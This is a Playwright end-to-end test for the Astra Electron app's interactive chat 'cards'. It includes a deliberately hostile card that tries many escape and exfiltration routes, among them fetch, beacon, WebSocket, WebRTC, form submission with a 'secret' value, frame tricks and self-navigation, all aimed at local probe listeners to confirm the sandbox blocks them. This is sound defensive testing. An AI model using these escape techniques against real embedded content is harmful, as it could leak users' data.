/** Interactive cards in the desktop: real Electron/Python, a loopback model, and a card that tries to get out. */
import { _electron as electron } from 'playwright';
import { expect } from '@playwright/test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { createServer as createTcpServer } from 'node:net';
import { createSocket } from 'node:dgram';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = resolve(fileURLToPath(new URL('../..', import.meta.url)));
const folder = mkdtempSync(join(tmpdir(), 'astra-card-'));
const workspace = join(folder, 'workspace'); mkdirSync(workspace);
const output = join(root, 'output/playwright/card'); mkdirSync(output, { recursive: true });
const listen = server => new Promise(done => server.listen(0, '127.0.0.1', () => done(server.address().port)));

// Anything that reaches these three listeners left the card: HTTP and WebSocket, a TCP relay, and UDP.
const reached = [];
const probe = createServer((req, res) => { reached.push(`http ${req.method} ${req.url}`); res.setHeader('Access-Control-Allow-Origin', '*'); res.end('reached'); });
probe.on('upgrade', (req, socket) => { reached.push(`websocket ${req.url}`); socket.destroy(); });
const relay = createTcpServer(socket => { reached.push('tcp relay'); socket.destroy(); });
const datagrams = createSocket('udp4'); datagrams.on('message', () => reached.push('udp'));
const probePort = await listen(probe), relayPort = await listen(relay);
const udpPort = await new Promise(done => datagrams.bind(0, '127.0.0.1', () => done(datagrams.address().port)));
const out = `http://127.0.0.1:${probePort}`;

const counterCard = `<h3>计数器</h3>
<p>已经点了 <strong id="n">0</strong> 次</p>
<button id="more">加一</button>
<script>
  let n = 0;
  document.getElementById('more').addEventListener('click', () => { document.getElementById('n').textContent = String(++n); });
</script>`;
// Each attempt records what happened to it; the address it tried to reach says which one got through.
const escape = `<p id="state">probing</p><pre id="result"></pre>
<form id="form" action="${out}/form" method="get"><input name="q" value="secret"></form>
<link rel="stylesheet" href="${out}/stylesheet">
<link rel="preconnect" href="http://127.0.0.1:${relayPort}">
<link rel="dns-prefetch" href="//127.0.0.1:${relayPort}">
<link rel="prefetch" href="${out}/prefetch">
<link rel="modulepreload" href="${out}/modulepreload.js">
<img src="${out}/img-tag" alt="">
<script src="${out}/script-tag"></script>
<style>@import url("${out}/css-import"); #state { background: url("${out}/css-url"); }</style>
<script>
(async () => {
  const result = {};
  const attempt = async (name, action) => { try { result[name] = String(await action()); } catch (error) { result[name] = 'blocked: ' + (error && error.name || error); } };
  await attempt('bridge', () => typeof window.astra);
  await attempt('parentDocument', () => parent.document.title);
  await attempt('parentBridge', () => typeof parent.astra);
  await attempt('topNavigation', () => { top.location = '${out}/top-navigation'; return 'sent'; });
  await attempt('storage', () => { localStorage.setItem('k', 'v'); return 'stored'; });
  await attempt('cookie', () => { document.cookie = 'k=v'; return document.cookie || 'empty'; });
  await attempt('popup', () => String(window.open('${out}/popup')));
  await attempt('fetch', () => fetch('${out}/fetch?secret=1').then(response => 'status ' + response.status));
  await attempt('xhr', () => new Promise((done, fail) => { const x = new XMLHttpRequest(); x.open('GET', '${out}/xhr'); x.onload = () => done('status ' + x.status); x.onerror = () => fail(new Error('network')); x.send(); }));
  await attempt('beacon', () => navigator.sendBeacon('${out}/beacon', 'secret'));
  await attempt('image', () => new Promise((done, fail) => { const i = new Image(); i.onload = () => done('loaded'); i.onerror = () => fail({ name: 'load error' }); i.src = '${out}/image-object'; }));
  await attempt('websocket', () => new Promise((done, fail) => { const w = new WebSocket('ws://127.0.0.1:${probePort}/websocket'); w.onopen = () => done('open'); w.onerror = () => fail({ name: 'socket error' }); }));
  await attempt('eventSource', () => new Promise((done, fail) => { const s = new EventSource('${out}/event-source'); s.onopen = () => done('open'); s.onerror = () => { s.close(); fail({ name: 'stream error' }); }; }));
  await attempt('dynamicScript', () => new Promise((done, fail) => { const s = document.createElement('script'); s.src = '${out}/dynamic-script'; s.onload = () => done('loaded'); s.onerror = () => fail({ name: 'load error' }); document.body.append(s); }));
  await attempt('importModule', () => import('${out}/module.js').then(() => 'imported'));
  await attempt('worker', () => { new Worker('${out}/worker.js'); return 'started'; });
  await attempt('evaluate', () => new Function('return 1 + 1')());
  await attempt('nestedFrame', () => new Promise(done => { const f = document.createElement('iframe'); f.src = '${out}/nested-frame'; f.onload = () => done('load event'); document.body.append(f); setTimeout(() => done('no load'), 800); }));
  await attempt('blankFrameNavigation', () => new Promise(done => { const f = document.createElement('iframe'); document.body.append(f); try { f.contentWindow.location = '${out}/blank-frame-navigation'; } catch (error) { done('blocked: ' + error.name); } setTimeout(() => done('sent'), 800); }));
  await attempt('blankFrameFetch', () => { const f = document.createElement('iframe'); document.body.append(f); return f.contentWindow.fetch('${out}/blank-frame-fetch').then(response => 'status ' + response.status); });
  await attempt('blankFrameWebrtc', () => { const f = document.createElement('iframe'); document.body.append(f); return typeof f.contentWindow.RTCPeerConnection + ' ' + typeof window[window.length - 1].webkitRTCPeerConnection; });
  // A frame written inline does run script, in a realm of its own.
  await attempt('inlineFrame', () => new Promise(done => {
    addEventListener('message', event => { if (event.data && event.data.inlineFrame) done(event.data.inlineFrame); });
    const f = document.createElement('iframe');
    f.srcdoc = '<script>const seen = [typeof RTCPeerConnection, typeof webkitRTCPeerConnection, typeof astra]; fetch("${out}/inline-frame-fetch").catch(() => {}); new Image().src = "${out}/inline-frame-image"; try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${udpPort}" }] }).createDataChannel("x"); } catch (error) { seen.push(error.name); } parent.postMessage({ inlineFrame: seen.join(" ") }, "*");<\\/script>';
    document.body.append(f); setTimeout(() => done('no report'), 1500);
  }));
  await attempt('webrtc', () => new Promise(done => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udpPort}' }, { urls: 'turn:127.0.0.1:${relayPort}?transport=tcp', username: 'u', credential: 'p' }] });
    const seen = []; pc.onicecandidate = event => { if (event.candidate) seen.push(event.candidate.type); };
    pc.createDataChannel('x'); pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(error => done('blocked: ' + error.name));
    setTimeout(() => done('candidates: ' + (seen.join(',') || 'none')), 1500);
  }));
  await attempt('formSubmit', () => { document.getElementById('form').submit(); return 'sent'; });
  await attempt('download', () => { const a = document.createElement('a'); a.href = '${out}/download'; a.download = 'x'; document.body.append(a); a.click(); return 'clicked'; });
  await attempt('linkClick', () => { const a = document.createElement('a'); a.href = '${out}/link-click'; document.body.append(a); a.click(); return 'clicked'; });
  document.getElementById('result').textContent = JSON.stringify(result);
  document.getElementById('state').textContent = 'probed';
  // Last, because the frame does not survive it: the card tries to navigate itself away.
  setTimeout(() => { location.href = '${out}/self-navigation?secret=1'; }, 1200);
})();
</script>`;
// The example in the guide, exactly as a reader would copy it.
const documented = /```card\n([\s\S]*?)\n```/.exec(readFileSync(join(root, 'docs/gui.md'), 'utf8'))[1];
const broken = `<p>before</p><script>throw new Error('CARD_FIXTURE_FAILURE');</script>`;
const fence = (language, body) => '```' + language + '\n' + body + '\n```';
const replies = {
  计数: `这是一个计数器。\n\n${fence('card', counterCard)}\n\n卡片后面的文字。`,
  逃逸: `试试能不能出去。\n\n${fence('card', escape)}`,
  文档: `文档里的例子。\n\n${fence('card', documented)}`,
  报错: `这张会出错。\n\n${fence('card', broken)}`,
  网页: `这只是代码。\n\n${fence('html', '<button id="plain">not run</button><script>document.title = "RAN"</script>')}`,
};
const requests = [];
let holdStream, streamHeld;
const model = createServer(async (req, res) => {
  if (req.method === 'GET') { res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify({ data: [{ id: 'card-test' }] })); return; }
  if (!req.url.endsWith('/chat/completions')) { res.writeHead(404); res.end(); return; }
  let body = ''; for await (const part of req) body += part;
  const payload = JSON.parse(body); requests.push(payload);
  const text = JSON.stringify(payload.messages.findLast(message => message.role === 'user')?.content ?? '');
  const reply = Object.entries(replies).find(([word]) => text.includes(word))?.[1] ?? 'PLAIN_REPLY';
  res.setHeader('Content-Type', 'text/event-stream');
  const chunk = (delta, finish_reason = null) => res.write('data: ' + JSON.stringify({ id: 'card-' + requests.length, object: 'chat.completion.chunk', created: Math.floor(Date.now() / 1000), model: 'card-test', choices: [{ index: 0, delta, finish_reason }] }) + '\n\n');
  if (text.includes('慢慢')) {
    // The fence is still open when the first half arrives.
    const middle = reply.indexOf('<button');
    chunk({ role: 'assistant', content: reply.slice(0, middle) });
    await new Promise(done => { streamHeld = true; holdStream = done; });
    chunk({ content: reply.slice(middle) });
  } else chunk({ role: 'assistant', content: reply });
  chunk({}, 'stop'); res.end('data: [DONE]\n\n');
});
const port = await listen(model);
writeFileSync(join(folder, '.env'), '');
writeFileSync(join(folder, 'settings.json'), JSON.stringify({ selected_model: 'card-test' }));
writeFileSync(join(folder, 'models.yaml'), `version: 1\nproviders:\n  test:\n    label: Local fixture\n    provider: openai-compatible\n    base_url: http://127.0.0.1:${port}/v1\n    api_key_env: ''\n    context_limit: 131072\n    capabilities: [tools, streaming]\nmodels:\n  card-test:\n    provider: openai-compatible\n    base_url: http://127.0.0.1:${port}/v1\n    api_key_env: ''\n    context_limit: 131072\n    capabilities: [tools, streaming]\n`);
const cleanEnv = Object.fromEntries(Object.entries(process.env).filter(([key]) => !/API_KEY|TOKEN|SECRET|^AGENT_|^ASTRA_|^LLM_|^SANDBOX_|^ELECTRON_/.test(key)));
const env = { ...cleanEnv, ASTRA_GUI_DISABLE_APPSHOT: '1', AGENT_PROJECT_ROOT: root, AGENT_PYTHON: process.env.AGENT_PYTHON || join(root, '.venv', process.platform === 'win32' ? 'Scripts/python.exe' : 'bin/python'), ASTRA_ENV_FILE: join(folder, '.env'), ASTRA_HOME: folder, AGENT_SETTINGS_PATH: join(folder, 'settings.json'), AGENT_SESSION_DIR: join(folder, 'sessions'), AGENT_TASK_DB: join(folder, 'tasks.db'), ASTRA_APPROVAL_DB: join(folder, 'approvals.db'), ASTRA_EVENT_DB: join(folder, 'events.db'), AGENT_MEMORY_PATH: join(folder, 'memory.db'), AGENT_LEARNING_PATH: join(folder, 'learning.db'), AGENT_SKILLS_PATH: join(folder, 'skills'), AGENT_MODELS_FILE: join(folder, 'models.yaml'), AGENT_USER_MODELS_FILE: join(folder, 'missing-models.yaml'), AGENT_LOG_DIR: join(folder, 'logs'), AGENT_MCP_CONFIG: join(folder, 'missing-mcp.json'), AGENT_TOOL_POLICY: 'locked', SANDBOX_DOCKER: 'false', SANDBOX_WORKDIR: workspace, ASTRA_WORKSPACE: workspace, LEARNING_REVIEW_AUTO: '0' };
const runFile = promisify(execFile);
async function bounded(promise, label, timeout) {
  let timer;
  try { return await Promise.race([promise, new Promise((_, reject) => { timer = setTimeout(() => reject(new Error(`${label} timed out after ${timeout} ms`)), timeout); })]); }
  finally { clearTimeout(timer); }
}
async function terminateFixture(app) {
  const child = app.process();
  if (child.exitCode !== null || child.signalCode !== null) return;
  const pid = child.pid;
  assert.ok(Number.isSafeInteger(pid) && pid > 0, 'only terminate this fixture Electron PID');
  if (process.platform === 'win32') { await runFile('taskkill.exe', ['/PID', String(pid), '/T', '/F'], { timeout: 5000, windowsHide: true }); return; }
  const { stdout } = await runFile('ps', ['-axo', 'pid=,ppid='], { timeout: 3000 });
  const rows = stdout.trim().split('\n').map(line => line.trim().split(/\s+/).map(Number));
  const owned = new Set([pid]);
  for (let changed = true; changed;) { changed = false; for (const [id, parent] of rows) if (owned.has(parent) && !owned.has(id)) { owned.add(id); changed = true; } }
  for (const id of [...owned].reverse()) { try { process.kill(id, 'SIGKILL'); } catch (error) { if (error.code !== 'ESRCH') throw error; } }
}

let app, failure, probed;
const errors = [], answered = [], checks = [];
const passed = name => { checks.push(name); console.log('PASS', name); };
try {
  // The listeners do hear what reaches them, so their silence later means something.
  await fetch(`${out}/control`);
  await new Promise(done => datagrams.send('control', udpPort, '127.0.0.1', done));
  await new Promise(done => setTimeout(done, 100));
  assert.deepEqual(reached.splice(0), ['http GET /control', 'udp']);

  app = await electron.launch({ args: [join(root, 'ui-gui')], env, timeout: 30000 });
  const page = await app.firstWindow(); page.setDefaultTimeout(30000);
  page.on('pageerror', error => errors.push(error.message));
  // A refused request is still announced; an answer or an opened socket means one got out.
  page.on('response', response => { if (/^https?:/i.test(response.url())) answered.push(response.url()); });
  page.on('websocket', socket => answered.push(socket.url()));
  const resize = async (width, height) => { await app.evaluate(({ BrowserWindow }, size) => BrowserWindow.getAllWindows()[0].setContentSize(...size), [width, height]); await page.waitForFunction(width => innerWidth === width, width); };
  await resize(1320, 900);
  console.log('START', folder);
  const composer = page.getByRole('textbox', { name: '消息', exact: true });
  const state = async () => page.evaluate(async () => { const boot = await window.astra.bootstrap(); return boot.sessions.find(item => item.id === boot.active); });
  const idle = async () => expect.poll(async () => { const current = await state(); return current?.status === 'ready' && !current.busy; }, { timeout: 30000 }).toBe(true);
  const send = async text => { await composer.fill(text); await page.getByRole('button', { name: '发送', exact: true }).click(); };
  // The list mounts only the rows near the viewport, so each card is found through its own reply.
  const reply = text => page.locator('.message.assistant').filter({ hasText: text });
  const counter = reply('这是一个计数器。'), hostile = reply('试试能不能出去。'), failing = reply('这张会出错。'), plain = reply('这只是代码。'), example = reply('文档里的例子。');
  const frame = message => message.locator('iframe.card-frame');
  const inside = message => frame(message).contentFrame();
  const scroller = page.locator('.messages-scroll');
  const reveal = async message => {
    for (let top = 0; top < 30000 && !(await message.count()); top += 300) { await scroller.evaluate((node, y) => { node.scrollTop = y; }, top); await page.waitForTimeout(80); }
    await message.locator('.card-block, .code-block').first().scrollIntoViewIfNeeded();
  };

  // While the block is being written nothing runs; once the fence closes the card appears and works.
  await send('慢慢 计数');
  await expect.poll(() => streamHeld).toBe(true);
  await expect(counter.locator('.card-block').getByRole('status')).toHaveText('卡片输入中…');
  await expect(page.locator('iframe')).toHaveCount(0);
  holdStream(); await idle();
  await expect(frame(counter)).toHaveCount(1);
  await expect(inside(counter).getByRole('heading', { name: '计数器' })).toBeVisible();
  await inside(counter).getByRole('button', { name: '加一', exact: true }).click();
  await inside(counter).getByRole('button', { name: '加一', exact: true }).click();
  await expect(inside(counter).locator('#n')).toHaveText('2');
  await expect(page.getByText('卡片后面的文字。', { exact: true })).toBeVisible();
  // The frame is as tall as its content and takes the reply's colours.
  const fit = async () => { const box = await frame(counter).boundingBox(); const content = await inside(counter).locator('body').evaluate(body => Math.ceil(body.getBoundingClientRect().height)); return [box.height, content]; };
  await expect.poll(async () => { const [frameHeight, content] = await fit(); return frameHeight === content && content > 60; }).toBe(true);
  const colours = () => Promise.all([page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--text').trim()), inside(counter).locator('html').evaluate(node => getComputedStyle(node).getPropertyValue('--text').trim()), inside(counter).locator('html').evaluate(node => getComputedStyle(node).colorScheme)]);
  const [hostText, cardText, scheme] = await colours();
  assert.deepEqual([cardText, scheme], [hostText, 'light']);
  await page.screenshot({ path: join(output, 'card.png') });
  passed('a card stays source while it is written, then runs, responds to clicks, fits its content and uses the theme');

  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark'; });
  await expect.poll(async () => (await colours()).slice(1)).toEqual([await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--text').trim()), 'dark']);
  assert.notEqual((await colours())[0], hostText);
  await expect(inside(counter).locator('#n')).toHaveText('2');
  await page.screenshot({ path: join(output, 'card-dark.png') });
  await page.evaluate(() => { document.documentElement.dataset.theme = 'system'; });
  // The source is one click away and the card comes back fresh.
  await counter.getByRole('button', { name: '查看源码', exact: true }).click();
  await expect(frame(counter)).toHaveCount(0);
  await expect(counter.locator('.card-block pre')).toContainText("document.getElementById('more')");
  await counter.getByRole('button', { name: '查看卡片', exact: true }).click();
  await expect(inside(counter).locator('#n')).toHaveText('0');
  passed('the card follows a theme change without restarting, and its source can be read');

  // A card that tries every way out. It learns nothing about the host, and nothing it sends arrives anywhere.
  await send('逃逸');
  await idle();
  await expect(inside(hostile).locator('#state')).toHaveText('probed', { timeout: 20000 });
  probed = JSON.parse(await inside(hostile).locator('#result').textContent());
  console.log('PROBED', JSON.stringify(probed));
  assert.equal(probed.bridge, 'undefined');
  for (const name of ['parentDocument', 'parentBridge', 'topNavigation', 'storage', 'cookie', 'fetch', 'xhr', 'image', 'websocket', 'eventSource', 'dynamicScript', 'importModule', 'evaluate', 'blankFrameFetch', 'webrtc'])
    assert.match(probed[name], /^blocked: /, `${name} must be refused: ${probed[name]}`);
  assert.equal(probed.popup, 'null');
  // Frames the card creates are no way back to them: an empty one is another origin, and one written inline starts without them.
  assert.doesNotMatch(probed.blankFrameWebrtc, /function/);
  assert.equal(probed.inlineFrame, 'undefined undefined undefined ReferenceError');
  // Then it navigates itself away: the host shows that it stopped, and its source instead of a refused page.
  await expect(hostile.locator('.card-block').getByRole('status')).toHaveText('卡片已停止：它试图离开自己的框。');
  await expect(frame(hostile)).toHaveCount(0);
  await expect(hostile.locator('.card-block pre')).toContainText('self-navigation');
  await new Promise(done => setTimeout(done, 1500));
  assert.deepEqual(reached, [], 'nothing the card tried reached a listener');
  assert.deepEqual(answered, [], 'nothing the window asked for was answered');
  assert.equal(await page.evaluate(() => location.href), 'astra://app/index.html');
  assert.equal(errors.length, 0, errors.join('\n'));
  await page.screenshot({ path: join(output, 'card-stopped.png') });
  passed('a hostile card cannot see the bridge or the host page, store anything, open anything, or reach the network by any route it tried');

  // A card whose script fails says so; an html block is code and never runs.
  await send('报错');
  await idle();
  await expect(failing.locator('.card-block').getByRole('status')).toHaveText(/卡片脚本出错：.*CARD_FIXTURE_FAILURE/);
  await expect(inside(failing).getByText('before', { exact: true })).toBeVisible();
  await send('网页');
  await idle();
  await expect(plain.locator('.code-block')).toContainText('not run');
  await expect(plain.locator('iframe')).toHaveCount(0);
  assert.equal(await page.title(), 'Astra');
  // The guide's own example works as written, with the inherited styles and nothing loaded.
  await send('文档');
  await idle();
  await expect(inside(example).locator('#total')).toHaveText('2,653');
  await inside(example).locator('#years').fill('1');
  await expect(inside(example).locator('#total')).toHaveText('1,050');
  await page.screenshot({ path: join(output, 'card-example.png') });
  passed('a failing card reports its error beside what it did render, an html block stays code, and the guide\'s example runs as written');

  // Scrolled out of the mounted rows and back, and reopened from saved history, the card runs again.
  await reveal(counter);
  await inside(counter).getByRole('button', { name: '加一', exact: true }).click();
  await expect(inside(counter).locator('#n')).toHaveText(/^[1-9]/);
  await page.reload();
  await expect(page.locator('.message.assistant').first()).toBeVisible();
  await reveal(counter);
  await inside(counter).getByRole('button', { name: '加一', exact: true }).click();
  await expect(inside(counter).locator('#n')).toHaveText('1');
  // In the smallest window it still fits.
  await resize(850, 600);
  await reveal(counter);
  await expect.poll(async () => { const [frameHeight, content] = await fit(); return frameHeight === content; }).toBe(true);
  assert.deepEqual(await page.evaluate(() => { const block = document.querySelector('.card-block'); return [block.scrollWidth <= block.clientWidth, document.documentElement.scrollWidth <= innerWidth]; }), [true, true]);
  await page.screenshot({ path: join(output, 'card-narrow.png') });
  // The hostile card ran again when the history was reopened, and stopped again.
  await reveal(hostile);
  await expect(hostile.locator('.card-block').getByRole('status')).toHaveText('卡片已停止：它试图离开自己的框。', { timeout: 30000 });
  await new Promise(done => setTimeout(done, 1500));
  assert.deepEqual(reached, [], 'the reopened hostile card reached nothing either');
  assert.deepEqual(answered, []);
  assert.equal(requests.length, 5, 'showing cards asks the model for nothing');
  passed('cards run again after scrolling away and from saved history, fit the smallest window, and still reach nothing');
  // The failing card's own exception is the only one, once per time it ran.
  assert.deepEqual([...new Set(errors)], ['CARD_FIXTURE_FAILURE']);
} catch (error) {
  failure = error; console.error(error);
  if (app) await bounded((async () => {
    const page = await app.firstWindow();
    console.error((await page.locator('body').innerText()).slice(-2000));
    console.error('REACHED', JSON.stringify(reached), 'ANSWERED', JSON.stringify(answered), 'PROBED', JSON.stringify(probed), 'ERRORS', JSON.stringify(errors));
    await page.screenshot({ path: join(output, 'failure.png'), timeout: 2000 });
  })(), 'Failure diagnostics', 3000).catch(error => console.error(error));
} finally {
  holdStream?.();
  if (app) {
    try { await bounded(app.close(), 'Electron close', 30000); }
    catch (error) { failure ||= error; console.error(error); await bounded(terminateFixture(app), 'Fixture process cleanup', 6000).catch(error => { failure ||= error; console.error(error); }); }
  }
  for (const server of [model, probe, relay]) await bounded(new Promise((done, reject) => { server.close(error => error ? reject(error) : done()); server.closeAllConnections?.(); }), 'Fixture listener close', 3000).catch(error => { failure ||= error; console.error(error); });
  datagrams.close();
}
writeFileSync(join(output, 'card-result.json'), JSON.stringify({ checks, errors, reached, answered, probed, folder, success: !failure, ...(failure ? { failure: String(failure) } : {}) }, null, 2));
if (failure) throw failure;
console.log(JSON.stringify({ checks: checks.length, output, folder }));
